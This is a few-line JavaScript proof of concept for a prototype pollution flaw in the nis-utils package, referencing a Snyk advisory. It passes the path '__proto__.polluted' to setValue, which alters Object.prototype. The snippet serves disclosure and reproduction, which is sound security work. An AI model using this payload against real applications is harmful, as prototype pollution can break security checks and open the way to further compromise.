//https://snyk.io/vuln/SNYK-JS-NISUTILS-598799

 
  const nisUtils = require("nis-utils");

  const object1 = {};
   

  nisUtils.object.setValue({}, "__proto__.polluted", "yes");
// End of file
